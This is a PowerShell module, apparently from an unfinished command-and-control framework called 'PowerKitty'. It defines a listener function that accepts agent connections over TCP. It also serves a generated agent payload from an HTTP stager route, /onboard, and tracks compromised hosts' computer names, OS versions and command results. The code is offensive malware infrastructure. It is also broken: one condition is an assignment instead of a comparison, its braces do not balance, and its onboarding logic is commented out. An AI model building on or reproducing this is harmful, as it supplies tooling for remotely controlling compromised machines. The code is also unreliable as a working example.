#
# New_Listerner.psm1
#
Function Global:New-Listerner()
{
	param
	(
		[Parameter()]
		[String]$ListerName,

		[Parameter()]
		[system.net.ipaddress]$LHOST = [system.net.ipaddress]::Loopback,

		[Parameter()]
		[ValidateRange(1, 65535)]
		[INT]$LPORT,

		[Parameter()]
		[String]$PSK,

		[Parameter()]
		[ValidateSet("Staged","Stageless")]
		[String]$StageType,

		[Parameter()]
		[ValidateRange(1, 65535)]
		[String]$StageLPORT = 80

	)

	# If global lister object doesnt exist,or is null - create one
	if(!($Global:ListernerPool)){
		$Global:ListernerPool = @()
	}
	# If global agent object doesnt exist,or is null - create one
	if(!($Global:AgentPool)){
		$Global:AgentPool = @()
	}

	# Build a simple TCP listerner
	[console]::Title = ("Server: $LHOST : $LPORT")
	$endpoint        = new-object System.Net.IPEndPoint ($LHOST, $LPORT)
	$listener        = new-object System.Net.Sockets.TcpListener $endpoint
	$listener.start()

	# Create a template listerner object
	$obj = [pscustomobject]@{
		Name       = [String]$ListerName
		UUID       = [String](New-Guid).Guid
		LHOST      = [system.net.ipaddress]$LHOST
		LPORT      = [INT]$LPORT
		RAWSOCK    = [Collections.Generic.List[Object]]$listener
		isStaged   = $false
		PSK        = $PSK
	}
	# add listerner psobject to array
	$Global:ListernerPool += $obj

	# add a runspace here (yes we are nesting)
	# add it once the listerner works. when its working, we can shove it into the background so the powershell terminal is free again.

	# setup stager http server
	if($StageType = "Staged")
	{
		$obj.isStaged = $true

		$http = [System.Net.HttpListener]::new() 
		$http.Prefixes.Add("http://$LHOST`:$StageLPORT/")
		$http.Start()

		while ($http.IsListening) {

			# Get Request Url
			# When a request is made in a web browser the GetContext() method will return a request object
			# Our route examples below will use the request object properties to decide how to respond
			$context = $http.GetContext()


			# ROUTE http://localhost:80/onboard
			# 
			if ($context.Request.HttpMethod -eq 'GET' -and $context.Request.RawUrl -eq '/onboard') {

				# We can log the request to the terminal
				write-host "$($context.Request.UserHostAddress)  =>  $($context.Request.Url)" -f 'mag'

				# the html/data you want to send to the browser
				# we generate a 
				[string]$html = (New-Agent -Listerner $obj -StageType Stageless).toString()
        
				#resposed to the request
				$buffer = [System.Text.Encoding]::UTF8.GetBytes($html) # convert htmtl to bytes
				$context.Response.ContentLength64 = $buffer.Length
				$context.Response.OutputStream.Write($buffer, 0, $buffer.Length) #stream to broswer
				$context.Response.OutputStream.Close() # close the response
    
			}
	}



	# continue accepting socket connections until object no longer exists
	while(Get-Listerner -UUID ($obj.UUID))
	{
		
		if($client = $listener.AcceptTcpClient())
		{
			
			"sock!"

			$Stream = $client.GetStream()
			$StreamWriter = New-Object System.IO.StreamWriter($Stream)
			$StreamWriter.AutoFlush = $true
			$StreamReader = New-Object System.IO.StreamReader($Stream)

	
			# wait for message
			while(!$Stream.DataAvailable)
			{
				# TODO: we need a way here to timeout, to not allow for denial of service
				Start-Sleep -Milliseconds 100
			}


			$agentmessage = $StreamReader.ReadLine()
			
			if($agentmessage -eq $PSK + "onboard")
			{
				<#

				porting this to http listerner

				# agent checkign in for the first time
				# add new agent here

				$Agent = [PSCustomObject]@{
					# required information
					UUID             = (New-Guid).Guid
					RAWConnection    = [PSObject]$client
					LHOST            = $obj.LHOST
					LPORT            = $obj.LPORT

					# information enumerated
					ComputerName     = [String]""
					OSVersion        = [String]""
					LastSeen         = [String](get-date)
					ExecutionPath    = [String]""
					ExecutionContext = [String]""

					# rsults sent back from commands
					ResponseQueue     = @()

					# objects to interact with
					StreamReader     = $StreamReader 
					StreamWriter     = $StreamWriter
				}
				
				$Global:AgentPool += $Agent
				#>


		}


			}
			elseif($agentmessage -eq $PSK + "checkin")
			{
				# check UID, and update agent with this UID
				# we probably need to serialize our messgaes here, and update all agent details with the correct 

			}
			# else, gtfo
			else
			{
				$agentmessage
				$StreamWriter.WriteLine("PowerKitty: Hisss!!!") | Out-Null
			}

				
			#$StreamWriter.Close()
			$StreamReader.Close()



			

		}
		
		# small sleep to not thrash CPU
	    Start-Sleep -Milliseconds 100
		
	}
	$listener.Stop();
	

}